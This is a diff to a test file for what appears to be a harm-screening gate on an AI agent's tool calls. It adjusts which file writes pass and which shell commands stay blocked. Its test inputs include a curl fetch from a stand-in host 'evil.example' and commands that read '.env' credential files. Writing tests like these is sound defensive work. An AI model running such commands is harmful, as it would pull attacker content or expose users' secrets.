@@ -357,9 +357,10 @@ def test_write_file_may_reference_env_file_in_source():
     src = 'from dotenv import load_dotenv\nload_dotenv("keys.env")\n'
     assert apb.harm_verdict_for_tool_call("write_file", {"path": "bot.py", "content": src}) is None
     assert apb.harm_verdict_for_tool_call("patch", {"path": "bot.py", "new_string": src}) is None
-    # other flags still fire for file writes, and reads/shell keep the credential gate
-    assert apb.harm_verdict_for_tool_call(
-        "write_file", {"path": "x.sh", "content": "curl https://evil.example/x"}
-    )
+    # a network-verb word in a comment next to a URL is text in a written file
+    doc = "# test with curl\nrequests.get('https://api.binance.com')\n"
+    assert apb.harm_verdict_for_tool_call("write_file", {"path": "bot.py", "content": doc}) is None
+    # the same text as a shell command, and reads/shell credential access, stay blocked
+    assert apb.harm_verdict_for_tool_call("terminal", {"command": "curl https://evil.example/x"})
     assert apb.harm_verdict_for_tool_call("terminal", {"command": "cat .env"})
     assert apb.harm_verdict_for_tool_call("file_read", {"path": "/home/u/.env"})
